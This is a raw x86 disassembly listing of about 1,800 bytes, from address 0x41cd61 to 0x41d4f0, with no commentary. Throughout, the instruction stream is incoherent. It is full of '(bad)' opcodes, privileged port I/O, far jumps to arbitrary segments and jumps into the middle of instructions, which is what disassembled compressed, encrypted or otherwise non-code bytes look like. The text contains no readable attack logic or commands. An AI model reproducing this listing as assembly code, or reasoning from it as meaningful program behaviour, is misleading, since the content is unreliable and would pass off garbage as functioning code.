  41cd61:	fadd   DWORD PTR [ebx+0x40bc98da]
  41cd67:	and    al,0xbd
  41cd69:	or     BYTE PTR [eax],cl
  41cd6b:	or     edi,edi
  41cd6d:	jge    0x41cd9d
  41cd6f:	adc    al,0x4
  41cd71:	jl     0x41cd92
  41cd73:	mov    edi,0x3b7ffef9
  41cd78:	push   ebx
  41cd79:	inc    ecx
  41cd7a:	sub    eax,0xda81a77c
  41cd7f:	mov    bl,0xb6
  41cd81:	loopne 0x41cd90
  41cd83:	jae    0x41cd77
  41cd85:	dec    ecx
  41cd86:	add    eax,0x6a09d21b
  41cd8b:	mov    edi,0x89e04641
  41cd90:	push   ebp
  41cd91:	in     al,0xdf
  41cd93:	ins    DWORD PTR es:[edi],dx
  41cd94:	or     bh,dl
  41cd96:	(bad)  
  41cd97:	aas    
  41cd98:	adc    al,0xc3
  41cd9a:	in     eax,0x5a
  41cd9c:	or     bh,BYTE PTR [edx+ebx*8]
  41cd9f:	mov    ah,0x87
  41cda1:	xchg   edi,eax
  41cda2:	jle    0x41cd5c
  41cda4:	jo     0x41cd5e
  41cda6:	push   0xbc9b0f06
  41cdab:	jne    0x41cdc8
  41cdad:	mov    ecx,0x1c02fa19
  41cdb2:	imul   edx,DWORD PTR [esi],0x9c1e7529
  41cdb8:	and    al,0xf
  41cdba:	jne    0x41cddb
  41cdbc:	dec    ecx
  41cdbd:	pop    ebp
  41cdbe:	bound  esp,QWORD PTR [edx+0x39eb28ef]
  41cdc4:	mov    al,cl
  41cdc6:	add    al,0x7c
  41cdc8:	aas    
  41cdc9:	and    al,ah
  41cdcb:	(bad)  
  41cdcd:	into   
  41cdce:	inc    ecx
  41cdcf:	or     al,0x42
  41cdd1:	jmp    0x2903:0x134c8d00
  41cdd8:	enter  0x7c6,0xb0
  41cddc:	pusha  
  41cddd:	push   eax
  41cdde:	mov    al,0xce
  41cde0:	cmp    BYTE PTR [edi],0xc6
  41cde3:	div    DWORD PTR [esi-0x44]
  41cde6:	pop    ds
  41cde7:	jmp    0x41ce54
  41cde9:	and    DWORD PTR [ecx-0x77498b20],0xcb27cf1a
  41cdf3:	add    edi,0x4f445844
  41cdf9:	push   es
  41cdfa:	in     al,dx
  41cdfb:	dec    eax
  41cdfc:	(bad)  
  41cdfd:	jmp    0x41ce56
  41cdff:	pmuludq mm4,mm2
  41ce02:	aaa    
  41ce03:	cld    
  41ce04:	mov    ebx,ecx
  41ce06:	f2xm1  
  41ce09:	fclex  
  41ce0c:	fldcw  WORD PTR ds:0xeed9566c
  41ce12:	jmp    0x84f1c264
  41ce17:	cmp    ecx,DWORD PTR [edx+0x2bff803e]
  41ce1d:	lods   al,BYTE PTR ds:[esi]
  41ce1e:	or     BYTE PTR ds:0xb7460175,ch
  41ce24:	dec    edi
  41ce25:	push   0x4670c107
  41ce2a:	cmp    ah,BYTE PTR fs:[eax+0x75]
  41ce2e:	or     BYTE PTR [esi-0x9],al
  41ce31:	outs   dx,DWORD PTR ds:[esi]
  41ce32:	outs   dx,DWORD PTR ds:[esi]
  41ce33:	js     0x41ce52
  41ce35:	cmp    al,0x39
  41ce37:	icebp  
  41ce38:	je     0x41ce89
  41ce3a:	and    al,0x24
  41ce3c:	fistp  QWORD PTR [eax*2+0x52460a75]
  41ce43:	sub    DWORD PTR [esi],eax
  41ce45:	clc    
  41ce46:	xlat   BYTE PTR ds:[ebx]
  41ce47:	jnp    0x41ceab
  41ce49:	pop    eax
  41ce4a:	add    edx,eax
  41ce4c:	jg     0x41cde6
  41ce4e:	jne    0x41ce83
  41ce50:	mov    eax,edx
  41ce52:	sahf   
  41ce53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce54:	ret    
  41ce55:	or     al,0x1
  41ce57:	add    al,0x44
  41ce59:	push   edi
  41ce5a:	push   edx
  41ce5b:	jg     0x41cdee
  41ce5d:	frstor [ebx+0x30e0d902]
  41ce63:	adc    BYTE PTR [edi+ebx*8],al
  41ce66:	aas    
  41ce67:	jmp    0x41ce6b
  41ce69:	fstp   TBYTE PTR [edi]
  41ce6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce6c:	mov    ch,0x0
  41ce6e:	mov    edx,0x9a9668c
  41ce73:	out    0xb0,al
  41ce75:	add    DWORD PTR [edi+edx*8-0x7b7df97e],edx
  41ce7c:	pop    ss
  41ce7d:	ins    DWORD PTR es:[edi],dx
  41ce7e:	and    ch,bl
  41ce80:	push   esi
  41ce81:	int    0x1b
  41ce83:	or     BYTE PTR [eax],ah
  41ce85:	mov    eax,0xbc203c04
  41ce8a:	test   BYTE PTR [ecx+0xbb72cac],dh
  41ce90:	cmp    al,0xfe
  41ce92:	cmp    al,BYTE PTR [edx+ecx*1]
  41ce95:	jae    0x41cea6
  41ce97:	fimul  DWORD PTR ds:0x4da62a6
  41ce9d:	inc    edx
  41ce9e:	jmp    0x41ce8a
  41cea0:	sub    BYTE PTR ds:0x8a376744,cl
  41cea6:	push   cs
  41cea7:	neg    BYTE PTR [edi-0x7]
  41ceaa:	or     BYTE PTR [ebx],0xfe
  41cead:	adc    esp,DWORD PTR [esi]
  41ceaf:	push   ebx
  41ceb0:	push   cs
  41ceb1:	inc    esi
  41ceb2:	imul   edx,edx,0xa
  41ceb5:	push   ds
  41ceb6:	cmp    edx,0xa08363f4
  41cebc:	jnp    0x41ce4e
  41cebe:	jb     0x41ceaa
  41cec0:	aaa    
  41cec1:	add    ch,BYTE PTR [eax+0x2b]
  41cec4:	call   0x3c0:0xef1e95b4
  41cecb:	push   0xf
  41cecd:	dec    esp
  41cece:	push   ebp
  41cecf:	fmul   st(6),st
  41ced1:	sub    BYTE PTR [esi],ah
  41ced3:	inc    esp
  41ced4:	rcl    BYTE PTR [esp+ebx*1+0x4cc88b84],0x47
  41cedc:	pop    eax
  41cedd:	leave  
  41cede:	push   cs
  41cedf:	push   ss
  41cee0:	pop    ebx
  41cee1:	fild   WORD PTR [eax+0xe]
  41cee4:	jb     0x41cef1
  41cee6:	pop    edi
  41cee7:	add    BYTE PTR [ecx-0x6d85f2ff],dh
  41ceed:	cdq    
  41ceee:	or     BYTE PTR [ebx-0x52a749b3],ah
  41cef4:	(bad)  
  41cef6:	mov    bl,0x6f
  41cef8:	test   bh,ch
  41cefa:	sbb    al,0x3d
  41cefc:	std    
  41cefd:	inc    edi
  41cefe:	dec    ebp
  41ceff:	push   es
  41cf00:	aam    0xd6
  41cf02:	fld    TBYTE PTR [esp]
  41cf05:	fstp   QWORD PTR [esi]
  41cf07:	fwait
  41cf08:	leave  
  41cf09:	add    al,0x4c
  41cf0b:	gs adc al,0x57
  41cf0e:	fld    DWORD PTR [esi]
  41cf10:	dec    ebx
  41cf11:	pop    esi
  41cf12:	ins    BYTE PTR es:[edi],dx
  41cf13:	out    0xb1,eax
  41cf15:	add    DWORD PTR [esi-0x5f],edi
  41cf18:	pop    ebp
  41cf19:	mov    fs:0x45ddc22c,al
  41cf1f:	or     BYTE PTR [edx+0x70],al
  41cf22:	daa    
  41cf23:	inc    edi
  41cf24:	scas   eax,DWORD PTR es:[edi]
  41cf25:	clc    
  41cf26:	add    BYTE PTR [ebx+0x247208ec],0x9b
  41cf2d:	pop    eax
  41cf2e:	pop    edx
  41cf2f:	(bad)  
  41cf30:	adc    edi,esi
  41cf32:	ins    BYTE PTR es:[edi],dx
  41cf33:	jp     0x41ceeb
  41cf35:	fnsave [ebx-0x14ebcd8c]
  41cf3b:	push   es
  41cf3c:	adc    eax,DWORD PTR ds:0x8950955a
  41cf42:	adc    DWORD PTR [edx+0x64],edx
  41cf45:	sub    BYTE PTR [ecx],cl
  41cf47:	mov    ah,0xe6
  41cf49:	or     BYTE PTR [edx],dl
  41cf4b:	dec    edi
  41cf4c:	sbb    eax,0x5c0ce620
  41cf51:	aad    0x34
  41cf53:	outs   dx,DWORD PTR ds:[esi]
  41cf54:	push   edi
  41cf55:	sbb    BYTE PTR cs:[ebx+0x4d],dh
  41cf59:	or     bh,dl
  41cf5b:	cmp    al,0x73
  41cf5d:	inc    edi
  41cf5e:	stc    
  41cf5f:	inc    ecx
  41cf60:	out    dx,eax
  41cf61:	cli    
  41cf62:	es test esp,ebp
  41cf65:	sahf   
  41cf66:	jae    0x41cfa2
  41cf68:	movzx  eax,ax
  41cf6b:	data16 sub dh,0x36
  41cf6f:	add    bl,dl
  41cf71:	cmp    ah,BYTE PTR [ecx+0x69d2106f]
  41cf77:	shl    BYTE PTR [eax-0x16],cl
  41cf7a:	out    dx,al
  41cf7b:	ret    0xd114
  41cf7e:	mov    esi,0xe864505c
  41cf83:	add    esi,DWORD PTR [edx-0xac246c]
  41cf89:	xor    bl,dh
  41cf8b:	add    al,0xd8
  41cf8d:	xor    eax,0x8e6823c
  41cf92:	fstp   QWORD PTR [eax]
  41cf94:	fwait
  41cf95:	add    BYTE PTR [edi-0x16],bl
  41cf98:	aam    0xc6
  41cf9a:	mov    dh,0x5e
  41cf9c:	mov    ebp,0xba2404c2
  41cfa1:	push   ss
  41cfa2:	retf   
  41cfa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfa4:	dec    esp
  41cfa5:	outs   dx,DWORD PTR ds:[esi]
  41cfa6:	mov    bl,0x24
  41cfa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfa9:	hlt    
  41cfaa:	xchg   ebx,eax
  41cfab:	je     0x41cfac
  41cfad:	jne    0x41cfbf
  41cfaf:	mov    edx,0xc0f1abec
  41cfb4:	cwde   
  41cfb5:	mov    ah,0x71
  41cfb7:	mov    BYTE PTR [ebp+ecx*4+0x4d],ah
  41cfbb:	(bad)  
  41cfbc:	mov    dx,0x96c6
  41cfc0:	iret   
  41cfc1:	jl     0x41cfd6
  41cfc3:	loopne 0x41d01f
  41cfc5:	int3   
  41cfc6:	push   esi
  41cfc7:	mov    ecx,ebx
  41cfc9:	push   ds
  41cfca:	cmp    al,0x0
  41cfcc:	pop    eax
  41cfcd:	ss scas eax,DWORD PTR es:[edi]
  41cfcf:	pop    ss
  41cfd0:	test   edi,0x3e8fc24
  41cfd6:	jmp    0x570c:0xb55cc3ad
  41cfdd:	enter  0xc132,0x83
  41cfe1:	loopne 0x41cfe6
  41cfe3:	fild   QWORD PTR [ebx+0x212835a1]
  41cfe9:	adc    bl,cl
  41cfeb:	ins    BYTE PTR es:[edi],dx
  41cfec:	mov    esi,0xf7d23321
  41cff1:	test   BYTE PTR [ebp-0x12345a53],0xd2
  41cff8:	jne    0x41d00e
  41cffa:	sbb    al,0xb9
  41cffc:	nop
  41cffd:	add    ecx,esi
  41cfff:	and    BYTE PTR [ebp-0x509b3f7e],dl
  41d005:	das    
  41d006:	jbe    0x41cf8c
  41d008:	adc    DWORD PTR [edi+0x720719b5],0xffffff98
  41d00f:	loope  0x41cfe2
  41d011:	fcomp  st(6)
  41d013:	pushf  
  41d014:	jg     0x41cfa3
  41d016:	add    al,0x40
  41d018:	add    al,0xc5
  41d01a:	aam    0x5f
  41d01c:	es (bad) 
  41d01e:	loope  0x41cfde
  41d020:	inc    BYTE PTR cs:[ecx]
  41d023:	jb     0xf787eb7
  41d029:	daa    
  41d02a:	ja     0x2e3d1db3
  41d030:	xor    BYTE PTR [ecx+0xa7d72d2],ah
  41d036:	or     al,0x77
  41d038:	ja     0x41d050
  41d03a:	sti    
  41d03b:	jno    0x41d0b5
  41d03d:	call   ebx
  41d03f:	push   0xfffffffc
  41d041:	(bad)  
  41d042:	nop
  41d043:	cmp    ebx,DWORD PTR [edx+eax*2-0x2]
  41d047:	ja     0x41d0ad
  41d049:	sbb    BYTE PTR [eax-0x1],cl
  41d04c:	pop    ebp
  41d04d:	stos   DWORD PTR es:[edi],eax
  41d04e:	sar    DWORD PTR [esi+0x11],0xbb
  41d052:	sub    al,0x3
  41d054:	pop    esp
  41d055:	dec    edx
  41d056:	inc    BYTE PTR [ecx+0x48]
  41d059:	inc    ecx
  41d05b:	mov    ebp,DWORD PTR [ebp+0x49ced075]
  41d061:	mov    eax,ecx
  41d063:	dec    ebx
  41d064:	cdq    
  41d065:	idiv   esi
  41d067:	imul   esi,ecx,0xe041c76d
  41d06d:	push   eax
  41d06e:	cs ror ebp,1
  41d071:	add    ebp,DWORD PTR [ebp-0xd13f123]
  41d077:	sub    esi,eax
  41d079:	ds ins DWORD PTR es:[edi],dx
  41d07b:	ds stc 
  41d07d:	add    esi,eax
  41d07f:	pop    esi
  41d080:	ret    
  41d081:	or     BYTE PTR [ecx-0x744f97a0],al
  41d087:	out    dx,al
  41d088:	xchg   DWORD PTR [edx-0x24],edi
  41d08b:	hlt    
  41d08c:	shr    DWORD PTR [ebx],1
  41d08e:	and    eax,DWORD PTR [ebp+0xcdfefd0]
  41d094:	inc    edx
  41d095:	and    BYTE PTR [ecx-0x1c],cl
  41d098:	mov    ah,0xd1
  41d09a:	push   eax
  41d09b:	sbb    bh,BYTE PTR [edi]
  41d09d:	xor    ah,ah
  41d09f:	dec    ebp
  41d0a0:	call   0xf0c19a2a
  41d0a5:	in     eax,0xa4
  41d0a7:	popf   
  41d0a8:	leave  
  41d0a9:	mov    ah,bh
  41d0ab:	push   cs
  41d0ac:	clc    
  41d0ad:	hlt    
  41d0ae:	ror    DWORD PTR [edx],0x38
  41d0b1:	mov    ah,0x8
  41d0b3:	add    edx,DWORD PTR [ebp+0x6e]
  41d0b6:	je     0x41d0a1
  41d0b8:	inc    edx
  41d0b9:	or     BYTE PTR [ebp+0x4207c8c0],0x36
  41d0c0:	dec    ecx
  41d0c1:	data16 lock jo 0x41d0c4
  41d0c5:	fwait
  41d0c6:	inc    esi
  41d0c7:	cmp    ecx,0x23ab1
  41d0cd:	jl     0x41d0e2
  41d0cf:	sub    ecx,0xa2c3120e
  41d0d5:	adc    ebp,ebp
  41d0d7:	dec    esp
  41d0d8:	inc    esp
  41d0d9:	and    eax,0xf2c0ed7d
  41d0de:	pop    esi
  41d0df:	lock scas al,BYTE PTR es:[edi]
  41d0e1:	or     bh,BYTE PTR [ebp-0x7153c148]
  41d0e7:	xchg   ecx,eax
  41d0e8:	inc    ecx
  41d0e9:	data16 mov es,WORD PTR [esi+ebx*4]
  41d0ed:	sbb    bl,dl
  41d0ef:	in     ax,dx
  41d0f1:	dec    WORD PTR [ebp+0x28]
  41d0f5:	cmp    DWORD PTR [eax],0x3c6b662c
  41d0fb:	fs push es
  41d0fd:	fmul   st,st(2)
  41d0ff:	ss pop ss
  41d101:	not    BYTE PTR [ebx+0x28]
  41d104:	call   0x10cc:0x5905b5f2
  41d10b:	fimul  DWORD PTR [ebp+0x2e0c12c]
  41d111:	cmp    esi,DWORD PTR [eax]
  41d113:	xchg   ebp,eax
  41d114:	loop   0x41d166
  41d116:	int    0x2
  41d118:	sub    cl,BYTE PTR [esi+0x5d]
  41d11b:	add    DWORD PTR [ebx],0x50b52545
  41d121:	mov    edx,eax
  41d123:	mov    dl,0x57
  41d126:	in     al,dx
  41d127:	fwait
  41d128:	inc    eax
  41d129:	dec    ebp
  41d12a:	mov    eax,ds:0xc87eb866
  41d12f:	and    BYTE PTR [esp+ecx*2+0x704d6a4e],ch
  41d136:	sbb    eax,0xee6c898a
  41d13b:	pushf  
  41d13c:	cmp    ecx,DWORD PTR [esi]
  41d13e:	jb     0x41d172
  41d140:	outs   dx,BYTE PTR ds:[esi]
  41d141:	sahf   
  41d142:	dec    ebx
  41d143:	stos   BYTE PTR es:[edi],al
  41d144:	sbb    ch,BYTE PTR [ecx]
  41d146:	inc    eax
  41d147:	jmp    0x41d125
  41d149:	dec    ebx
  41d14a:	inc    eax
  41d14b:	or     al,0xf5
  41d14d:	jecxz  0x41d168
  41d14f:	jo     0x41d14b
  41d151:	sar    DWORD PTR [eax],1
  41d153:	int    0x4
  41d155:	add    BYTE PTR [esp+edx*1],ah
  41d158:	hlt    
  41d159:	cmp    esi,DWORD PTR [esp+ecx*2-0x29]
  41d15d:	jl     0x41d1b6
  41d15f:	push   ecx
  41d160:	mov    esp,0xd1047ef0
  41d165:	mov    edi,0xfe4c2f80
  41d16a:	cmc    
  41d16b:	jae    0x41d111
  41d16d:	pop    esi
  41d16e:	mov    ch,0xe8
  41d170:	mov    al,0xd5
  41d172:	(bad)  
  41d173:	daa    
  41d174:	cmp    eax,0x6a64e8f8
  41d179:	xor    ebx,DWORD PTR [ebp+edx*4-0x6904604]
  41d180:	xchg   edx,eax
  41d181:	inc    eax
  41d182:	or     DWORD PTR [ecx],eax
  41d184:	aas    
  41d185:	aad    0x0
  41d187:	mov    eax,0x66704e54
  41d18c:	lea    ecx,[eax]
  41d18e:	push   ebp
  41d18f:	dec    edi
  41d190:	sub    DWORD PTR [eax],edx
  41d192:	(bad)  
  41d193:	call   0x4003:0x3f407dbb
  41d19a:	sub    ebx,DWORD PTR [ecx-0x4f2cfb04]
  41d1a0:	mov    edx,0xda9825d1
  41d1a5:	test   BYTE PTR [edx],bl
  41d1a7:	jmp    0x88fd7158
  41d1ac:	xchg   edx,eax
  41d1ad:	and    eax,0x11948d40
  41d1b2:	ds inc eax
  41d1b4:	test   esp,0x88d2290
  41d1ba:	add    DWORD PTR [eax-0x163ca4cd],ebx
  41d1c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1c1:	adc    al,0x6f
  41d1c3:	add    al,0x3b
  41d1c5:	or     ebx,ebx
  41d1c7:	fild   QWORD PTR [edx]
  41d1c9:	ret    
  41d1ca:	adc    DWORD PTR [ebp+0x50],esi
  41d1cd:	pop    ecx
  41d1ce:	aas    
  41d1cf:	mov    cs,WORD PTR [esi-0x64492891]
  41d1d5:	dec    edx
  41d1d6:	push   0x4
  41d1d8:	jle    0x41d1ba
  41d1da:	ins    BYTE PTR es:[edi],dx
  41d1db:	mov    cl,BYTE PTR [esi+edx*2-0x17ff1b60]
  41d1e2:	or     al,0xec
  41d1e4:	and    al,0xe0
  41d1e6:	mov    edx,0x6a046d78
  41d1eb:	mov    ecx,0xba764278
  41d1f0:	retf   0x35ee
  41d1f3:	push   cs
  41d1f4:	loopne 0x41d1ab
  41d1f6:	rcr    BYTE PTR [edi+ecx*4],1
  41d1f9:	ss push ss
  41d1fb:	call   0x4f79670b
  41d200:	or     edx,esp
  41d202:	jno    0x41d1cc
  41d204:	test   al,0x10
  41d206:	add    bl,ch
  41d208:	add    dl,BYTE PTR [esi+0x10]
  41d20b:	fadd   DWORD PTR ds:0x128ac1fb
  41d211:	inc    edx
  41d212:	cmp    dl,BYTE PTR [ecx-0x5]
  41d215:	je     0x41d1d7
  41d217:	cwde   
  41d218:	cld    
  41d219:	inc    eax
  41d21a:	sti    
  41d21b:	in     eax,dx
  41d21c:	add    BYTE PTR [esi],bh
  41d21e:	jo     0x41d1a9
  41d220:	inc    edx
  41d221:	hlt    
  41d222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d223:	pop    esp
  41d224:	cmp    BYTE PTR [eax-0x13],0x8a
  41d228:	mov    ch,0x45
  41d22a:	inc    esi
  41d22b:	inc    eax
  41d22c:	sub    cl,BYTE PTR [edi]
  41d22e:	adc    dh,BYTE PTR [eax+0xc]
  41d231:	add    al,0x8
  41d233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d235:	mov    bh,0xfb
  41d237:	push   ss
  41d238:	lea    ecx,[eax-0x12]
  41d23b:	or     edx,DWORD PTR [eax-0x10]
  41d23e:	lahf   
  41d23f:	push   0xecc33474
  41d244:	lea    esp,[ebp+0x1ed40c6]
  41d24a:	jb     0x41d2bb
  41d24c:	jecxz  0x41d27f
  41d24e:	jb     0x41d249
  41d250:	mov    dh,0x85
  41d252:	push   esi
  41d253:	in     al,0x50
  41d255:	jge    0x41d23d
  41d257:	call   0xe80da321
  41d25c:	jmp    0xb84f:0x1e33c72
  41d263:	bound  eax,QWORD PTR [ecx]
  41d265:	out    0xe4,eax
  41d267:	dec    BYTE PTR [eax+0x403a138d]
  41d26d:	arpl   WORD PTR [ebp+0x0],si
  41d270:	cld    
  41d271:	in     al,0x71
  41d273:	xchg   DWORD PTR [esp+ebx*2+0x46],esi
  41d277:	dec    ebp
  41d278:	jno    0x41d2ea
  41d27a:	cmp    BYTE PTR [eax-0x38],al
  41d27d:	xor    edx,DWORD PTR [ebx-0x35]
  41d280:	outs   dx,BYTE PTR ds:[esi]
  41d281:	adc    eax,0xfb01eaf0
  41d286:	add    bh,cl
  41d288:	out    dx,al
  41d289:	out    dx,al
  41d28a:	pop    eax
  41d28b:	mov    edx,0x866a8814
  41d290:	jmp    0x406acf9d
  41d295:	push   0xc5e83f00
  41d29a:	loope  0x41d2c4
  41d29c:	xchg   esp,eax
  41d29d:	fwait
  41d29e:	in     al,dx
  41d29f:	call   0x373c9256
  41d2a4:	jp     0x41d251
  41d2a6:	test   al,0x1b
  41d2a8:	push   eax
  41d2a9:	push   0x6bae32a5
  41d2ae:	jo     0x41d25b
  41d2b0:	outs   dx,BYTE PTR ds:[esi]
  41d2b1:	xchg   ebp,eax
  41d2b2:	push   ebp
  41d2b3:	mov    ecx,0xbf02806a
  41d2b8:	dec    DWORD PTR [ebx+0x4e]
  41d2bb:	jne    0x3ce3034d
  41d2c1:	outs   dx,BYTE PTR ds:[si]
  41d2c3:	inc    eax
  41d2c4:	lds    ebp,FWORD PTR [ebp+0x8221412]
  41d2ca:	or     eax,0x3867d75
  41d2cf:	mov    al,0x35
  41d2d1:	inc    edi
  41d2d2:	sahf   
  41d2d3:	inc    ecx
  41d2d4:	mov    al,ds:0xa1bc89c
  41d2d9:	sti    
  41d2da:	std    
  41d2db:	add    DWORD PTR [ebp+0x403d8360],edi
  41d2e1:	pop    eax
  41d2e2:	add    DWORD PTR [ebp+0x57],esi
  41d2e5:	sub    al,0xc5
  41d2e7:	jns    0x41d284
  41d2e9:	mov    edi,ds
  41d2eb:	adc    DWORD PTR [ebx+0x42759a20],ebx
  41d2f1:	jb     0x41d2f6
  41d2f3:	add    eax,0x343b3c03
  41d2f8:	fld    DWORD PTR [ebx]
  41d2fa:	ret    0x5e48
  41d2fd:	inc    esi
  41d2fe:	in     al,0x3d
  41d300:	jae    0x41d2f3
  41d302:	cmp    ch,al
  41d304:	sahf   
  41d305:	sbb    esp,DWORD PTR cs:[edx]
  41d308:	mov    esp,0xc7102763
  41d30d:	ret    
  41d30e:	aaa    
  41d30f:	into   
  41d310:	xor    DWORD PTR fs:[ecx+0x40],0x6b
  41d315:	enter  0xc76d,0xc4
  41d319:	imul   edi,DWORD PTR [ecx+esi*1],0x8311e5db
  41d320:	cmp    eax,0x6757200a
  41d325:	addr16 push es
  41d327:	xlat   BYTE PTR ds:[ebx]
  41d328:	inc    edx
  41d329:	pop    esi
  41d32a:	ret    
  41d32b:	in     al,0xec
  41d32d:	retf   
  41d32e:	test   BYTE PTR [eax+0x39264980],0xec
  41d335:	out    dx,al
  41d336:	repnz loope 0x41d302
  41d339:	push   cs
  41d33a:	stos   DWORD PTR es:[edi],eax
  41d33b:	adc    al,0x7f
  41d33d:	pmullw mm1,QWORD PTR [ecx+ecx*4]
  41d341:	jmp    0x41d350
  41d343:	mov    ecx,0xf3d90990
  41d348:	sbb    BYTE PTR [ecx-0x5bd81314],cl
  41d34e:	ret    
  41d34f:	and    DWORD PTR [ebx+esi*1-0x15],esi
  41d353:	in     al,dx
  41d354:	jne    0x41d374
  41d356:	ret    
  41d357:	popa   
  41d358:	clc    
  41d359:	or     eax,0x3038804e
  41d35e:	jne    0x41d377
  41d360:	push   ebx
  41d361:	mov    eax,ecx
  41d363:	dec    ecx
  41d364:	retf   0x8e70
  41d367:	and    eax,ecx
  41d369:	add    al,BYTE PTR [edi]
  41d36b:	std    
  41d36c:	push   ds
  41d36d:	or     cl,0x45
  41d370:	icebp  
  41d371:	lock out dx,eax
  41d373:	jns    0x41d3ee
  41d375:	add    cl,bh
  41d377:	sub    DWORD PTR [esi-0x7],0x1b0417
  41d37e:	(bad)  
  41d37f:	aam    0x11
  41d381:	push   0xd472869f
  41d386:	add    al,0xd8
  41d388:	(bad)  
  41d389:	fs sub ebp,eax
  41d38c:	mov    ?,WORD PTR [ebp+0x53]
  41d38f:	(bad)  
  41d390:	nop
  41d391:	mov    al,ds:0x3ea1d991
  41d396:	sub    al,0x5d
  41d398:	pop    es
  41d399:	ins    DWORD PTR es:[edi],dx
  41d39a:	mov    eax,0x2382b394
  41d39f:	xor    al,0x2
  41d3a1:	loop   0x41d3f0
  41d3a3:	pop    ds
  41d3a4:	inc    DWORD PTR [eax-0x54932c3a]
  41d3aa:	and    al,0xe2
  41d3ac:	and    BYTE PTR [esi],al
  41d3ae:	in     eax,dx
  41d3af:	add    bl,ah
  41d3b1:	loope  0x41d40d
  41d3b3:	inc    edx
  41d3b4:	and    DWORD PTR [ebp+0x18938078],edi
  41d3ba:	mov    esp,0xc3477ab
  41d3bf:	and    cl,BYTE PTR [ecx+0x405a30f]
  41d3c5:	pop    esp
  41d3c6:	cdq    
  41d3c7:	dec    edx
  41d3c8:	loopne 0x41d39f
  41d3ca:	jae    0x41d3f3
  41d3cc:	jmp    0x41d3d4
  41d3ce:	dec    esi
  41d3cf:	pushf  
  41d3d0:	jae    0x41d3df
  41d3d2:	fucomip st,st(2)
  41d3d4:	adc    DWORD PTR [edx+0xf],ebx
  41d3d7:	popf   
  41d3d8:	push   0xc27d9506
  41d3dd:	push   edi
  41d3de:	jmp    0x5dcbf750
  41d3e3:	aam    0x4
  41d3e5:	lahf   
  41d3e6:	sub    al,0x1a
  41d3e8:	jae    0x41d444
  41d3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3eb:	repz push ss
  41d3ed:	pushf  
  41d3ee:	adc    al,0xbf
  41d3f0:	inc    esi
  41d3f1:	dec    ebp
  41d3f2:	jne    0x41d3d4
  41d3f4:	xchg   ebp,eax
  41d3f5:	add    BYTE PTR [esi-0x28],ch
  41d3f8:	jge    0x41d3dc
  41d3fa:	dec    eax
  41d3fb:	push   ss
  41d3fc:	dec    esi
  41d3fd:	mov    BYTE PTR [ebp-0x1e],bl
  41d400:	mov    ebx,0xda24e9a3
  41d405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d406:	fidiv  WORD PTR [esi+0x74870f38]
  41d40c:	mov    edx,0x6e0c5c17
  41d411:	add    BYTE PTR [edi],0x8a
  41d414:	cmp    bh,0x24
  41d417:	test   DWORD PTR [eax+0xc],eax
  41d41a:	test   ecx,ecx
  41d41c:	retf   
  41d41d:	mov    ss,WORD PTR [eax+0x9]
  41d420:	push   cs
  41d421:	or     eax,0x3a5ff9f2
  41d426:	mov    dh,0xe
  41d428:	or     eax,DWORD PTR [eax]
  41d42a:	or     al,0x5
  41d42c:	add    eax,DWORD PTR [eax]
  41d42e:	add    al,BYTE PTR [esi]
  41d430:	add    al,0x7
  41d432:	out    dx,eax
  41d433:	popa   
  41d434:	arpl   WORD PTR [edx-0x7af590f7],sp
  41d43a:	or     BYTE PTR [eax+0x4f9bcf80],al
  41d440:	repz jns 0x41d449
  41d443:	cld    
  41d444:	sub    DWORD PTR [ebx+0x4e8c3b8e],ecx
  41d44a:	lea    ebx,[ebx+0x7f34f3cf]
  41d450:	mov    al,0xe5
  41d452:	push   ss
  41d453:	mov    cs,WORD PTR [edi-0x658f771]
  41d459:	xor    al,0xed
  41d45b:	adc    edx,DWORD PTR [eax-0x102fbbce]
  41d461:	add    ebp,DWORD PTR [edx]
  41d463:	jbe    0x41d465
  41d465:	pop    ecx
  41d466:	or     eax,0xc2885930
  41d46b:	pop    es
  41d46c:	or     al,0x3a
  41d46e:	pop    eax
  41d46f:	and    edi,edi
  41d471:	dec    edx
  41d472:	mov    ecx,0xa78a1e09
  41d477:	fyl2x  
  41d479:	mov    eax,edx
  41d47b:	mov    eax,ds:0xf759b475
  41d480:	xchg   edi,eax
  41d481:	pop    eax
  41d482:	bound  ebp,QWORD PTR [edi+0x45]
  41d485:	mov    edx,0x4b9d2f04
  41d48a:	dec    edi
  41d48b:	and    BYTE PTR [bp+si+0x55],0x8d
  41d490:	pushw  es
  41d492:	and    DWORD PTR [eax-0x7a8dc628],ebp
  41d498:	je     0x41d4f3
  41d49a:	xchg   esp,eax
  41d49b:	aam    0x78
  41d49d:	adc    al,0xce
  41d49f:	(bad)  
  41d4a0:	sub    esp,esp
  41d4a2:	aam    0xf4
  41d4a4:	dec    eax
  41d4a5:	ror    BYTE PTR [ecx-0x31547d40],0x18
  41d4ac:	jmp    0x41d4de
  41d4ae:	sbb    DWORD PTR [edx-0x24],ebp
  41d4b1:	push   edx
  41d4b2:	shl    DWORD PTR [eax+0x45],0x2a
  41d4b6:	add    al,0x85
  41d4b8:	pushf  
  41d4b9:	mov    ss,WORD PTR [edx+0x3b]
  41d4bc:	inc    edi
  41d4bd:	jnp    0x41d454
  41d4bf:	xor    ecx,esp
  41d4c1:	leave  
  41d4c2:	(bad)  [esi-0xd443d60]
  41d4c8:	dec    eax
  41d4c9:	je     0x41d514
  41d4cb:	add    al,0x6d
  41d4cd:	jmp    0x41d54e
  41d4cf:	shl    BYTE PTR [ebp-0x2a10491c],0xee
  41d4d6:	push   es
  41d4d7:	leave  
  41d4d8:	push   ebx
  41d4d9:	mov    ds:0x142f9b7b,al
  41d4de:	mov    esi,0x923dfcba
  41d4e3:	push   edi
  41d4e4:	ins    BYTE PTR es:[edi],dx
  41d4e5:	dec    ebp
  41d4e6:	sbb    BYTE PTR [edi-0x5f],ah
  41d4e9:	test   BYTE PTR [ebx+ecx*2],cl
  41d4ec:	scas   al,BYTE PTR es:[edi]
  41d4ed:	popf   
  41d4ee:	jne    0x41d569
  41d4f0:	sbb    al,0x27
